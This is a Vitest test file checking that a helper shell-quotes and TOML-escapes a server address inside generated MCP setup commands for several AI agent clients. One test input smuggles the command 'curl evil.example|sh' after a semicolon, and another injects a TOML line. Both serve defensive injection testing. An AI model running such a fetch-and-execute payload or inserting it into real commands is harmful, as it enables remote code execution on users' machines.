import { describe, expect, it } from 'vitest'

import { agentClients, shellWord } from './agentClients'

const steps = (id: string, address: string) =>
  agentClients.find((c) => c.id === id)!.steps(address, 'https://poly.example/.well-known')

describe('the address in the commands you copy (A8)', () => {
  it('stays as it is where it is plain', () => {
    expect(shellWord('https://poly.example:8443/mcp')).toBe('https://poly.example:8443/mcp')
    expect(steps('claude-code', 'https://poly.example/mcp')[0].code).toBe(
      'claude mcp add --transport http --scope user polythought https://poly.example/mcp',
    )
  })

  it('is one quoted word to a shell, and one string to TOML, where it is not', () => {
    const odd = "https://poly.example/mcp;curl evil.example|sh 'x'"

    expect(shellWord(odd)).toBe(`'https://poly.example/mcp;curl evil.example|sh '\\''x'\\'''`)
    expect(steps('gemini-cli', odd)[0].code).toBe(
      `gemini mcp add --transport http --scope user polythought ${shellWord(odd)}`,
    )
    expect(steps('codex', 'https://poly.example/mcp"\nx = 1')[0].code).toContain(
      'url = "https://poly.example/mcp\\"\\nx = 1"\n',
    )
  })
})
